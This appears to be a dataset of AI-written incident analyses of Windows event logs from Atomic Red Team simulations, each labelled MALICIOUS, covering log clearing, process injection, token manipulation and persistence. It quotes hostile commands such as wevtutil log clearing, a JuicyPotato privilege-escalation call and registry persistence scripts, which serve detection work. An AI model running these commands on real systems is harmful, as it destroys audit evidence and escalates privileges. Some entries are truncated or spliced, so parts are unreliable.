   - Multiple logs show the execution of `wevtutil.exe` with the command to clear event logs, e.g., ""wevtutil.exe cl Security"" and similar entries for System, Application, and PowerShell logs:
     - Command lines include sequences such as:
       - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
       - `wevtutil.exe cl System`
       - `wevtutil.exe cl Application`
       - `wevtutil.exe cl Security`
       - `wevtutil.exe cl ""Windows PowerShell""`
   - The log entries related to the clearing are:
     - Sysmon EventID 5: Logs showing process GUIDs for `wevtutil.exe` at various instances being executed by `admin_test`.
     - System EventID 104: Records that indicate the log clearance under the user `admin_test`.
     - Security EventID 1102: Specifically indicates that the security logs were cleared.
   - These actions are highly suspicious due to their common use in attempts to cover tracks by malicious actors.

2. **Execution of Suspicious PowerShell Script:**
   - There is an instance of PowerShell being used to execute a script with a temp directory path:
     - The command executed is using PowerShell to run `CreateProcessWithPipe.exe` from an Atomic Red Team test path, indicating a potential simulation or exploitation:
       - `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055.012\bin\x64\CreateProcessWithPipe.exe -program \""C:\Windows\System32\werfault.exe\"" -debug}`
   - The presence of tools in the `AtomicRedTeam` path is indicative of red teaming or testing activities but could also represent an attack simulation in progress without authorization.

3. **Time Change Events:**
   - The system logs indicate time change events which can be a tactic to confuse log timelines and make forensic analysis difficult:
     - Security EventID 4616 and Kernel-General EventID 1 show changes to system time.

### Conclusion and Resolution:

Based on the analysis, the primary concern is the clearance of important event logs and the execution of potentially suspicious scripts in the environment related to known tactics used during attacks, including time manipulation.

Given these findings, the resolution for this analysis is:

**MALICIOUS** - The activities observed are consistent with behaviors typical of attempts to cover tracks and potentially execute unauthorized scripts indicative of an attack method in progress or being tested without clear authorization.

Service Installation CMD,"## Detailed Analysis of Logs

### Suspicious or Anomalous Behavior

1. **PowerShell Usage**: In the Sysmon logs, there is a record of the execution of `powershell.exe` under `SERVER002\admin_test`. Powershell execution can indicate either administrative scripting or a potential vector for attacks using malicious scripts.

2. **Unexpected Service Creation and Execution**:
   - The logs show the creation and starting of a service `AtomicTestService_CMD` using `sc.exe`. This is flagged in Sysmon log event 17991 where `cmd.exe` is executed with command-line operations involving `sc.exe` to create and start a service pointing to `AtomicService.exe`.
   - The `AtomicService.exe` is executed under `NT AUTHORITY\SYSTEM`, indicating high privilege.

3. **Log File Clearing**:
   - Logs in the System Channel were cleared by user `admin_test`.
   - Logs in the Security Channel were also cleared by the same user.
   - Clearing log files can be a strong indicator of malicious intent, as it can be used to hide tracks of unwanted activity.

4. **Use of Command-Line Tools `wevtutil` and `whoami`**:
   - Multiple instances of `wevtutil.exe` are executed, potentially to manipulate log files.
   - `whoami.exe` is used, providing the executing user's information.
   - This behavior could indicate reconnaissance activity or efforts to maintain anonymity.

### Indicators of Malicious Activity

- **Service Creation (T1543.003)**: The usage of `sc.exe` to create a service that executes an `AtomicRedTeam` binary suggests a simulation or potential weaponization process. Red Team tools used in production environments need thorough vetting as they can be used for malicious purposes.
- **Privileges and Execution**: Commands executed at a System integrity level can be leveraged for substantial unauthorized access or modifications.
- **Event ID 1102** in the Security logs: Security event logs clearance suggests a possibility of covering unauthorized or malicious activities.

### Assessment of the Situation

The logs collectively indicate:
- The creation and running of a potentially unauthorized and unsanctioned service.
- Clearing of logs can be seen as a cover-up for prior unauthorized actions.
- Execution of system-critical operations through command-line and PowerShell without immediate contextual justification can be potentially dangerous.

### Threats or Risks Identified

- **Privilege Escalation**: Commands executed at System level involve high privileges, which pose a threat if executed maliciously.
- **Persistent Backdoor**: The creation and usage of services without explicit authorized need could be housing a backdoor process for remote access or data exfiltration.
- **Data Manipulation and Exfiltration**: With cleared logs, actions involving sensitive information are harder to track.

### Guidance on How to Proceed

1. **Immediate Response**:
   - Quarantine or monitor the machine until a thorough investigation is completed.
   - Investigate user `admin_test` actions and obtain relevant authorizations for these operations.
   - Verify the source and intention behind `AtomicService.exe`.

2. **Audit and Review**:
   - Collect network traffic logs to determine if data exfiltration occurred.
   - Check the configuration and integrity of services running on the host.
   - Review user access policies and privileges.

3. **Further Investigation**:
   - Conduct a deeper review using EDR solutions to trace back any command and control activity.
   - Review the presence of other tools or anomalies in linked systems that might be part of a wider intrusion.

### Resolution

Given the potential of unauthorized service creation, process executions involving scripts and logging clearances that can hide malicious activities, the resolution classification for this analysis is:

**MALICIOUS**"
Process Hollowing using PowerShell,"Based on the provided Windows event logs, several indicators of potentially malicious activity are present:

1. **Event Log Clearing Activities**:
   - There are multiple entries indicating that log files have been cleared using `wevtutil.exe` (Event ID 1102 in the Security log and Event ID 104 in the System log). This tool is used to manage Windows event logs, and its use to clear logs (`wevtutil.exe cl ...`) can be indicative of an attempt to cover tracks after unauthorized activities.
   - Additionally, such actions should prompt concerns particularly since they are performed by an account named `admin_test`.

2. **Privilege Escalation**:
   - Event ID 4672 shows a logon event with special privileges by the `admin_test` account, which include privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeBackupPrivilege`. The use of such privileges in a production environment should be scrutinized, as these are typically not used casually.

3. **Suspicious PowerShell Execution**:
   - PowerShell log events show the execution of a script named `Start-Hollow.ps1` from a temporary directory. This script is associated with Atomic Red Team tests, specifically T1055.012 (Process Hollowing). This is commonly used for adversarial simulation or red team exercises but can represent a significant risk if used without authorization.
   - The `Start-Hollow.ps1` script appears to be intended for process injection and/or replacement, referencing executable paths such as `notepad.exe` and `cmd.exe`.

4. **Process Execution Patterns**:
   - The `wevtutil.exe` and `conhost.exe` processes are seen interacting repeatedly in a fashion typical of obfuscation or concealment operations, as observed in the Sysmon logs.

5. **Potential Command and Control Behavior**:
   - The presence of tools typically used in reconnaissance or network exploration, such as `whoami.exe` and `hostname.exe`, suggest deeper exploration or preparation for additional unauthorized actions.

6. **Unauthorized Process Creation**:
   - Evidence that `powershell.exe`, set to execute scripts from unexpected directories, points toward this activity being beyond normal administrative operations (e.g., running from `%appdata%` temp directories).

### Assessment:
The logs contain multiple red flags indicating instances of:
- Use of system utilities to clear logs.
- Execution of potentially unauthorized PowerShell scripts with adversarial simulation tools.
- User accounts leveraging high-level privileges.

### Conclusion:
The activity observed in the logs is **MALICIOUS**. It suggests actions consistent with an insider threat, red team exercise without clear authorization, or a security breach.

### Recommendations:
1. **Incident Response**: Engage your incident response team immediately to contain, investigate, and eradicate the threat.
2. **Audit Accounts**: Verify the `admin_test` account activity, take steps to confirm its legitimacy or potential compromise.
3. **Review PowerShell Scripts**: Identify the origin and purpose of scripts executed. If unauthorized, disable and remove them.
4. **Implement Monitoring**: Enhance monitoring of administrative tools and script execution across critical infrastructure.
5. **Communication**: Inform executive leadership and affected stakeholders about potential impacts and ongoing response efforts.

1. **Log Clearing Activity**: 
   - Multiple instances of logs being cleared are recorded. Specifically, the system, PowerShell, and security logs were cleared using `wevtutil.exe`. Clearing logs is often indicative of an attempt to cover tracks and hide malicious activities. The clearing was executed by the user `admin_test`.

2. **Suspicious PowerShell Commands**:
   - The PowerShell logs indicate the execution of a command using `powershell.exe` involving `werfault.exe` and a suspicious executable `RtlCreateUserThread.exe` located in a temporary directory related to ""AtomicRedTeam"", which is a known adversary emulation framework. This could suggest execution of payloads designed to simulate or perform malicious actions.

3. **Time Tampering**:
   - Multiple occurrences of time change events in the Kernel-General and Security logs indicate that the system time was altered. Such actions can be used to mislead log timestamps, potentially masking illicit activities.

4. **Privilege Escalation and Use of High Privileges**:
   - The logs show that the user `admin_test` utilized high privileges, including `SeDebugPrivilege`, `SeSecurityPrivilege`, among others, which are often leveraged for advanced system-level actions or privilege escalation.

5. **Execution of Common Attack Tools**:
   - The use of tools like `whoami.exe` and `hostname.exe` alongside clearing logs and leveraging elevated privileges aligns with tactics for gathering system information and performing post-exploitation activities.

**Assessment and Resolution**:
Given the combination of log-clearing, suspicious PowerShell execution, and privilege misuse, there is substantial evidence of malicious activity. The logs not only indicate potentially unauthorized actions but also efforts to obfuscate those actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Isolation**: Isolate the affected machine, in this case, the CEO's machine, from the network to prevent further potential compromise or data exfiltration.

2. **Forensics and Incident Response**: Conduct a thorough forensic investigation to analyze how the compromise occurred and the extent of the intrusion. Additionally, check for any signs of data exfiltration or unauthorized access beyond what is recorded in these logs.

3. **Credential and Privilege Review**: Reset credentials, particularly for the `admin_test` account, and review all accounts with elevated privileges for potential misuse.

4. **Implement Monitoring and Alerts**: Enhance logging and monitoring capabilities, specifically for log-clearing activities, time changes, and PowerShell command executions, to quickly detect any similar future incidents.

Portable Executable Injection,"### Log Analysis and Findings

Upon reviewing the logs provided, several suspicious activities have been identified that suggest potential malicious activity on the system. Key observations are outlined below:

1. **Log Clearing Activities:**
   - The logs show several instances of the `wevtutil.exe` command being used to clear various logs, specifically the Security, System, Windows PowerShell, and Sysmon logs, as indicated by events with the command `wevtutil.exe cl`. This activity is often associated with attempts to cover tracks from potentially malicious actions.

2. **High Privilege Usage:**
   - The user `admin_test` has used high privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. While the presence of these privileges alone is not suspicious, their use in combination with other factors like log clearing can be a red flag for malicious intent.

3. **Execution of Non-standard Scripts:**
   - The PowerShell logs show the execution of a script that attempts to run `RedInjection.exe`. This executable appears to be linked to a path associated with Atomic Red Team, a widely-used tool for simulating adversary techniques. The particular technique (T1055.002 - Process Injection) commonly relates to code injection, a tactic used by malware to maintain persistence and evade detection.

4. **Process Injections and Stopping Legitimate Processes:**
   - The PowerShell command was designed to inject into processes and stop Notepad if it was running (`Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force`). This suggests direct manipulation and interference with normal process operations, further indicating attempts to tamper with the host system.

5. **Tools and Execution Patterns:**

### Analysis of Logs:

1. **PowerShell Log:**
   - The PowerShell events indicate a script that creates a directory and writes random bytes to a `comadmin.dat` file. This behavior can be suspicious as it may indicate a scripted operation to either hide data or execute something harmful.
   - PowerShell is often used for administrative tasks, but its use for tasks like creating random files in system directories can indicate potential malicious use, especially if not part of regular operations.

2. **System Log:**
   - The system log shows that the event logs for ""System"", ""Windows PowerShell"", and ""Security"" channels have been cleared by a user named `admin_test`. Clearing logs is often used to hide malicious activity and is generally suspicious unless there is a justified reason.

3. **Sysmon Log:**
   - Multiple invocations of `wevtutil.exe` to clear event logs (`cl` command) by the user `admin_test` on important channels (Sysmon, Application, Windows PowerShell) are highly suspicious and suggest an attempt to cover tracks.
   - Numerous executions and processes related to `conhost.exe` and `wevtutil.exe` in rapid succession suggest command-line activities possibly trying to manipulate logs.
   - There are multiple Microsoft Edge update processes recorded. These could be benign if they match known update procedures, but the combination with cleared event logs raises the suspicion level.

4. **Security Log:**
   - The security log confirms the log clearing activity (`EventID` 1102) related to `admin_test`, which heightens suspicion of malicious intent as it is usually to hide unauthorized actions.

### Assessment:

- **Log Clearing:** The act of clearing logs is a significant indicator of possible malicious activity. It suggests that someone is trying to obfuscate actions on the system, typically associated with unauthorized or malicious behavior.
  
- **Use of PowerShell:** The specific command associated with writing random data might indicate either a test or malicious activity if this event is not normal within the organization's typical operational patterns.

- **Combination of Activities:** When log clearing is coupled with suspicious PowerShell scripts and an unusual amount of Edge update activity, it strengthens the case for potential malicious action.

### Conclusion:

Resolution: **MALICIOUS**

- The combination of log clearing by `admin_test`, paired with suspicious scripting activities via PowerShell, strongly suggests activities intended to conceal actions taken on the machine. This behavior aligns with tactics used in various post-exploitation scenarios.
  
### Guidance:

1. **Incident Response Activation:** Initiate a full incident response process to contain and investigate further. Ensure no malicious persistence mechanisms are in place.
  
2. **Forensic Analysis:** Conduct a more in-depth forensic analysis to understand the extent of compromise and actions taken.
  
3. **Review Access Logs & Network Traffic:** Examine other access logs and network traffic to detect any lateral movement or data exfiltration attempts.
  
4. **Review and Harden Security Policies:** Ensure auditing policies gather adequate logging and that administrative access to logs is thoroughly controlled and reviewed."
Parent PID Spoofing - Spawn from Current Process,"**Detailed Analysis of the Logs:**

1. **Windows PowerShell Log:**
   - We observe multiple PowerShell activities on `Server002`. The command executed is:
     ```
     powershell.exe & {Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID}
     ```
   - The `Start-ATHProcessUnderSpecificParent` function is unusual and not typically found in standard PowerShell sessions. This command attempts to start a PowerShell process under a specific parent, potentially used to mask malicious activity under a legitimate process.
   - The use of PowerShell with an sleep command (`Start-Sleep`) can be indicative of an attempt to delay execution, which is a common tactic in scripting attacks to avoid detection by security solutions.

2. **System Log:**
   - The `EventID: 104` events indicate that multiple log files have been cleared, including System and Windows PowerShell channels. This action, particularly by an account named `admin_test`, is suspicious as log clearing is a common practice to cover tracks after malicious activity.

3. **Sysmon Log:**
   - We observe the execution of `wevtutil.exe` to clear logs using the command:
     ```
     ""C:\Windows\system32\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational
     ```
   - This further corroborates the suspicious clearing of logs as observed previously.
   - Multiple instances of PowerShell and Console Window Host (`conhost.exe`) processes are noted, which can be routine unless coupled with suspicious command lines or behavior.
   - Execution of `compatTelRunner.exe` and services such as `sppsvc.exe` and `taskhostw.exe` were observed but seem legitimate as they are part of routine system processes.

4. **Security Log:**
   - `EventID: 1102` suggests security logs were cleared by `admin_test`, supporting the hypothesis of log tampering.

5. **Application Log:**
   - Contains standard entries related to the routine operation of applications, with no direct linkage to suspicious activity.

**Assessment of the Situation:**
- The combination of PowerShell use in an atypical manner, specific command executions that may indicate process masquerading, and the clearing of event logs are strong indicators of potentially malicious activity.

**Threats or Risks Identified:**
- Potential unauthorized access and execution of suspicious PowerShell commands.
- Possible compromise to the integrity of server logs, which impacts the ability to perform forensic analysis efficiently.

**Guidance on How to Proceed:**
- Immediate investigation into the `admin_test` account activities, as it is responsible for the problematic actions observed.
- Capture and preserve current system state for further forensic investigation.
- Monitor PowerShell execution more closely and consider implementing tighter PowerShell script execution policies.
- Review user permissions and protocols around log file access to prevent unauthorized clearance.

**Resolution: MALICIOUS**
- Given the observed behavior is consistent with tactics used in malicious breaches, especially with abnormal PowerShell commands and log tampering, this activity should be treated as malicious and warrant immediate security incident response measures."
Access Token Manipulation,"### Detailed Analysis

After a thorough review of the provided Windows event logs, several indicators suggest malicious activity on the host, specifically involving a potential privilege escalation and clearing of system logs.

#### Suspicious Activities

1. **PowerShell Script Execution:**
   - A PowerShell script, `GetToken.ps1`, was executed with commands aimed at setting the execution policy to bypass and potentially accessing LSASS processes to create a new process from a parent (which could imply an attempt to impersonate a token or escalate privileges).
   - The script was executed from the Temp folder often associated with suspicious activities or malware execution.
   - The PowerShell command line includes suspicious activities: modifying execution policy, listing processes with owner details, and invoking a potential exploit script targeting token manipulation from LSASS, which is common in credential dumping attacks.

2. **Event Log Clearing:**
   - Log files for several channels were cleared (Security, System, Windows PowerShell), indicating potential log tampering to cover tracks post-compromise.
   - This activity is unusual and suspicious as attackers often clear logs to remove evidence of their activities.

3. **Unusual Process Activity:**
   - Processes like `wevtutil.exe` are executed multiple times with commands to clear logs from different channels, corroborating the log clearing evidence.
   - High integrity level for various processes and use of the built-in Windows tools for potentially illicit purposes suggest abuse of administrative privileges.

4. **Edge Update and System Executions:**
   - Although Edge updates and related processes seem frequent, there is extensive execution with some processes handling system updates under `NT AUTHORITY\SYSTEM` which could be normal background updates. This increased activity is likely benign but occurs around the same time as the malicious indicators, warranting further inspection for anomalies among these processes.

#### Indicators of Malicious Activity

- Execution of scripts like `GetToken.ps1` aimed at modifying sensitive system tokens.
- Clearing of important logs, including security logs.
- The `Set-ExecutionPolicy` to `Bypass` and the use of PowerShell to potentially perform privilege escalation or credential dumping.

### Assessment

Having analyzed these event logs, there are strong indicators of malicious activity:

- The use of PowerShell for altering execution policies and engaging with processes owned by the system or other users, signaling attempts to escalate privileges.
- The deliberate clearing of logs points directly to attempts to erase traces of potentially malicious activity.

### Resolution

**MALICIOUS**

The combination of potentially exploitative PowerShell commands, log clearing actions, and attempts to tamper with system state implies a coordinated attempt to compromise the system integrity. Immediate action is required to isolate the affected system, conduct a deeper forensic analysis, and verify the scope of potential breaches and compromised data.

### Recommendations

1. **Immediate Containment:**
   - Isolate affected system(s) from the network to prevent further spread or remote access.

2. **Investigation:**
   - Conduct a thorough forensic investigation to determine the method of entry, extent of compromise, and potential data loss or exfiltration.

3. **Monitoring:**
   - Increase monitoring of similar suspicious activities across other systems to detect any related incidents.

4. **Remediation:**
   - Identify and rectify any vulnerabilities exploited in the attack path.
   - Rebuild or restore systems from a known clean backup.
  
5. **Review and Hardening:**
   - Review security policies, especially regarding PowerShell execution and logging practices.
   - Implement stricter group policies and execution policies to prevent similar future occurrences.

6. **Incident Report:**
   - Document the incident details for organizational awareness and compliance purposes."
HKLM - Modify default System Shell - Winlogon Shell KEY Value,"### Detailed Analysis:

#### Indicators of Malicious Activity:

1. **Suspicious PowerShell Usage**:
   - The PowerShell logs show activities involving modifications to the Windows registry, particularly the ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"" key. This key is critical as it dictates what applications run on user logon. The script suggests that it sets a backup and then appends an existing value with `explorer.exe`, which could be an attempt to masquerade malicious activity or persistence through script tampering or Trojan installation.
   - The modification of this registry key without proper context indicates possible malicious persistence techniques often used by malware to ensure execution upon startup.

2. **Log Clearing**:
   - Both the System and Security logs have events indicating logs were cleared (EventID: 1102 and 104), and these actions were performed under the `SERVER002\admin_test` user. This is a common technique employed by attackers to cover their tracks once they have performed illicit actions on a compromised host.

3. **Wevtutil Usage**:
   - Sysmon logs display `wevtutil.exe` processes being executed with the command `wevtutil cl` to clear event logs. This aligns with the previous point of log tampering and anomaly in typical system administration activities.
   
4. **Privilege Usage**:
   - The user `admin_test` has used NTLM authentication and acquired multiple privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.) often associated with administrative and sensitive operations, which could indicate credential compromise or insider threat activity.

#### Threats or Risks Identified:

- **Persistence Mechanism**: The PowerShell script modifies critical registry keys for persistence, which could potentially be used for executing malicious code each time the user logs in.
- **Log Tampering**: Clearing logs is a direct attempt to evade detection and forensic analysis, strongly implying malicious intent.
- **Unauthorized Privilege Access**: Acquiring an extensive list of high-level privileges can enable unauthorized access or manipulation of system configurations and data.

### Assessment and Resolution:

Based on the detailed analysis of the event logs, there is strong evidence of malicious activities involving registry modifications for persistence, unauthorized log clearance, and elevated privileges which could be the execution of an attack or breach.

### Resolution: MALICIOUS

### Guidance on How to Proceed:

1. **Immediate Response**:
   - Isolate the machine from the network to prevent further spread.
   - Deploy endpoint detection and response (EDR) tools for thorough scanning and instant incident response.
   
2. **Forensic Investigation**:
   - Perform a full forensic analysis of the system to identify the scope and impact of the compromise.
   - Review access logs, user activities, and any data exfiltration attempts.
   
3. **Mitigation and Remediation**:
   - Revoke or review user privileges for unnecessary high-level access.
   - Restore the affected system from known clean backups.
   - Apply security patches and updates promptly.

4. **Follow-up Actions**:
   - Educate users about security best practices, especially in handling emails and executing scripts.
   - Implement advanced threat protection mechanisms such as network segmentation and enhanced logging to prevent future incidents.

5. **Report to Relevant Authorities**:
   - Depending on the regulatory requirements, report the incident to relevant authorities or organizations overseeing cybersecurity protocols."
Parent PID Spoofing using PowerShell,"### Analysis of the Windows Event Logs

#### 1. Suspicious Log Clearing Activity:
- **EventID 1102** in the Security log and **EventID 104** in the System log indicate that the event logs (""Security"" and ""System"" channels) were cleared. This action was performed by `admin_test`.
- Clearing of logs, particularly security logs, is often a technique used by malicious actors to cover their tracks after illicit activities.
  
#### 2. Unauthorized Use of PowerShell Script:
- There is evidence of PowerShell being used to execute a script named `PPID-Spoof.ps1`, located in a potentially malicious directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1134.004\src\PPID-Spoof.ps1`). The usage of temporary directories for executing scripts could indicate an attempt to evade detection.
- This script involves PPID spoofing, which is a technique to change the parent process ID to masquerade as a trusted process, a known tactic used by adversaries.

#### 3. Multiple Privileged Actions:
- **EventID 4672** signifies the assignment of special privileges to `SYSTEM`, which includes powerful rights like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. This itself might be normal, but in conjunction with other suspicious activities, it’s concerning.

#### 4. Execution of Command Line Utility (wevtutil.exe):
- We see a sequence of executions of `wevtutil.exe` used to clear the `Sysmon`, `Application`, and `Security` logs. This behavior is typical of an attacker trying to erase evidence after performing illicit actions.

#### 5. Execution of Scripts from Suspicious Directories:
- The presence of files and commands such as the spoofing PowerShell script further supports the assumption of malicious activity, exploiting potentially compromised scripts.

#### 6. Presence of Applications Typically Not Located/Executed:
- The execution of certain binaries like `wevtutil.exe` or the specific PowerShell activities in the given directories suggests attempts to leverage native Windows tools for potentially malicious purposes.

### Assessment and Conclusion
The combination of log clearing, the execution of suspicious scripts, utilization of PowerShell for potentially malicious tasks, and privilege escalation activities suggest a strong case for malicious activity. The attempt to use `PPID-Spoof.ps1` for parent process ID spoofing further implies that the host might be a target of advanced exploitation or lateral movement attempts.

### Guidance on How to Proceed
- **Immediate Isolation**: The server should be isolated from the network to prevent potential further exploitation or lateral movement.
- **Deep Forensics**: Conduct a full forensic investigation on the host. Look for artifacts and signatures of persistence mechanisms, rogue software installations, or unexpected scheduled tasks.
- **Audit and Review Permissions**: Review and tighten administrative privileges and access controls to prevent unauthorized access.
- **Log Monitoring and Alerts**: Enhance monitoring of logs with alerts for actions such as log clearing, the execution of suspicious PowerShell scripts, and unexpected privilege escalations.

### Resolution: MALICIOUS

The logs show evidence strong enough to confirm malicious activities. Immediate action and detailed investigation are required to understand the full scope and impact of the compromise."
At.exe Scheduled task,"### Analysis of Logs:

- **Security Log (EventID 1102)**: The event log was cleared by the user ""admin_test"" on Server002. Clearing event logs is often a tactic used by malicious actors to cover their tracks. This is suspicious, especially when done by users with administrative privileges.
  
- **Sysmon Log**:
  - Multiple instances of the command-line utility `wevtutil.exe` are invoked by the user ""admin_test"" to clear event logs, including Security, System, Application, and Windows PowerShell logs. The command lines such as `""C:\\Windows\\system32\\wevtutil.exe"" cl Security` indicate log clearing for these channels, which aligns with the event log clearings seen in the security and system logs.
  - The use of processes like `cmd.exe`, `at.exe`, and `conhost.exe` with a high integrity level by the same user ""admin_test"" suggest potentially evasive behavior. The command line `cmd.exe /c at 13:20 /interactive cmd` is especially concerning as it may be attempting to schedule a task to maintain persistence or further execute commands.
  - Utilization of legitimate system utilities such as `HOSTNAME.EXE` and `whoami.exe` may indicate enumeration activity, potentially to gather system information for further malicious actions.

- **System Log**:
  - Mirroring the security log, `wevtutil.exe` is used to clear specific logs, corresponding to the system channel. This is corroborated by the presence of EventID 104 entries in the system log showing log clearing actions.

- **Application Log**:
  - Minimal relevant information was captured here, although the logs were attempted to be cleared along with other channels, as indicated by Sysmon logs.

### Assessment:
The investigation indicates several indicators of potential compromise:
1. **Log Clearing**: The repetitive clearing of event logs (security, system, application) by ""admin_test"" indicates a high likelihood of malicious activity. This behavior is usually associated with an attempt to hide tracks.
2. **Command Execution**: Execution of multiple command-line operations with elevated privileges.
3. **Task Scheduling**: Use of the `at.exe` command for scheduling could indicate an attempt for persistent or scheduled execution without user knowledge.
4. **Time Manipulation**: There are events related to slight time changes which could relate to attempts at obscuring activity windows.

### Resolution:
**MALICIOUS** - These logs contain definitive indicators of malicious activity. The intentional clearing of logs, execution of suspicious commands, and schedule changes suggest an effort to hide potential malicious actions.

### Recommended Actions:
1. **Immediate Containment**: Disconnect the affected host from the network to prevent further spread or exfiltration.
2. **Comprehensive Review**: Conduct a thorough forensic review of the system's full execution context, including possibly undetected artifacts or malware.
3. **Change Credentials**: Enforce immediate change of credentials for the affected administrator account and others potentially exposed.
4. **Review Scheduled Tasks**: Investigate any unknown scheduled tasks that may perpetuate the malicious behavior.
5. **Re-Enable Logging**: Ensure all logging functionalities are re-enabled and closely monitored for any further suspicious activities."
Domain Password Policy Check: No Lowercase Character in Password,"Upon reviewing the event logs, several behaviors stand out that could indicate potentially malicious activity:

1. **Clearing of Event Logs:**
   - Multiple logs were cleared by the user `admin_test` shortly after PowerShell commands were executed. This is highly suspicious because attackers often clear logs to cover their tracks. The Security, System, and Windows PowerShell logs being cleared is particularly concerning.

2. **Suspicious PowerShell Activity:**
   - The PowerShell script executed by `SERVER002\admin_test` attempts to reset the account password to `UPPER-LONG-SPECIAL-333`. It checks if the new password is the same as the one stored in a credential file located at `$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt`. This indicates a potentially unauthorized use of credentials and possibly the automation of a password change, which might align with exploitation frameworks or penetration testing tools.
   - The PowerShell script catches error code 86, a typical code indicating incorrect password issues, and logs specific messages. This level of logging and error handling in a user-authored script often indicates premeditated execution of potentially harmful actions. 

3. **Use of `wevtutil` to Clear Logs:**
   - The process `wevtutil` was used multiple times from the `admin_test` account to clear various event logs (`Sysmon/Operational`, `Application`, `Security`). This is not a typical administrative action and correlates with attempts to hide activity.

4. **High Integrity Level Processes:**
   - The processes executed under the `admin_test` account mostly run at a high integrity level, which indicates that they are operating with elevated privileges. Such actions often symbolize privilege escalation or the execution of high-impact commands.

The combination of clearing logs, executing a PowerShell script that changes credentials and handles errors meticulously, and the invocation of utility tools to remove event traces, all indicate potential malicious activity occurring on the server.

**Assessment:**
Based on the analysis of event log activities:

- **Resolution: MALICIOUS**
  
**Guidance:**
1. **Immediate Action:**
   - Isolate the host (Server002) from the network to prevent further propagation or data exfiltration.
   - Initiate a thorough forensic investigation to determine the extent of the compromise, focusing on any potentially exfiltrated data or additional malicious activities.
  
2. **Further Investigation:**
   - Analyze the logs prior to clearing for any additional context or sequences of events leading to this activity.
   - Investigate the user account `admin_test` for unauthorized access or internal threats.
   - Review Active Directory logs for anomalous authentication attempts or password resets associated with `admin_test`.

3. **Remediation:**
   - Change all credentials that may have been compromised, focusing on those accessible by `admin_test`.
   - Patch any identified vulnerabilities that may have been exploited during this incident.
   - Review and strengthen access controls and audit policies to prevent future incidents.

4. **Post-Incident Monitoring:**
   - Increase monitoring on critical systems and accounts for behavior anomalies.
   - Implement alerts for log clearance activities and PowerShell script executions with similar patterns.

Addressing these activities will mitigate the current threat and help secure the environment against similar future incidents."
Juicy Potato,"### Detailed Analysis

#### Indicators of Malicious Activity

- **Log Clearing Activities:**
  - Multiple log files, including System, Windows PowerShell, and Security logs, were cleared by the user `admin_test`. This activity is captured in the 'System log' and 'Security log', particularly in the Event ID 104 for System and Event ID 1102 for Security, indicating logs being cleared by wevtutil.exe. This behavior is often an indicator of malicious activity as it suggests an attempt to cover tracks.

- **Process Execution:**
  - The command line argument associated with `wevtutil.exe` clearing logs is suspicious. It is not common for log clearing operations to be executed in such a manner without proper tracking or without a justified administrative task.
  - Usage of `JuicyPotato.exe` as observed in the PowerShell logs with the command line:
    - `""cmd /c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\\system32\\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'""`. 
  - `JuicyPotato` is a well-known tool often used for privilege escalation. The usage of this tool is inherently suspicious and aligns with indicators of exploitative activities within the system.

- **Privilege Escalation Attempt:**
  - The execution of the `JuicyPotato.exe` potentially signifies an attempt to escalate privileges within the system. The arguments and execution method alongside the subsequent command execution (`cmd.exe` spawned by PowerShell) imply exploitation attempts.

#### Anomalous Behavior

- Execution from Temporary Directories:
  - Execution of files from temporary directories can sometimes indicate temporary usage of executables often associated with attacks. Here, the suspicious execution of `JuicyPotato.exe` is seen from a temporary path which adds to the concern.

- System Integrity Violated:
  - The clearing of event logs within seconds suggests an orchestrated attempt to tamper logs which indicates malicious intent, especially when coupled with the execution of known malicious tools.

### Assessment

Based on the available event logs for the host system ""Server002"", there are clear indicators of potential malicious activity. The activities surrounding the clearing of logs, execution of `JuicyPotato.exe`, and the command lines used point towards a compromise and privilege escalation attempt. The use of wevtutil.exe coupled with `JuicyPotato.exe` is highly suggestive of an attacker attempting to gain higher privileges and cover their tracks by deleting entries from various logs.

### Threats or Risks Identified

- Potential unauthorized access or privileged escalation attempts.
- Log manipulation to prevent forensic analysis.
- Potential lingering threats if attacker actions have established persistence on the system.

### Guidance on How to Proceed

- Immediate isolation of the affected system for full incident response analysis.
- Conduct a thorough investigation to determine the scope of the breach.
- Perform a detailed review of user access rights and audit similar processes on other critical systems.
- Reverse-engineer memory dumps if feasible to understand the infiltration method and payloads.
- Implement stricter access controls and monitoring for the admin accounts.
- Assess the need to restore systems from a known clean backup if compromise is validated.

### Resolution

**MALICIOUS** - The investigation indicates a significant risk to the system’s integrity and security posture, with clear evidence of malicious activity."
Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"### Analysis:

1. **PowerShell Activity:**
   - Several PowerShell events indicate the execution of a complex command sequence using `powershell.exe`:
     ```plaintext
     New-Item -ItemType Directory -path ""$env:TMP\atomictest\"";
     Copy-Item -path ""C:\Windows\System32\calc.exe"" -destination ""$env:TMP\atomictest\"";
     Set-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Common Startup"" -Value ""$env:TMP\atomictest\""
     ```
   - This script creates a directory, copies `calc.exe` to this new directory, and modifies the registry to set a startup folder path. This behavior is highly suspicious as it replicates known tactics for establishing persistence by modifying startup entries.

2. **Event Log Clearance:**
   - Security and System logs have events that indicate they were cleared (`EventID 1102` for the Security log and `EventID 104` for the System log). 
   - The clearing of logs is a common method attackers use to cover their tracks post-exploitation.

3. **Sysmon Events:**
   - There are multiple entries where `wevtutil.exe` was used with the `cl` command to clear event logs (`CommandLine=""C:\Windows\system32\wevtutil.exe"" cl System`).
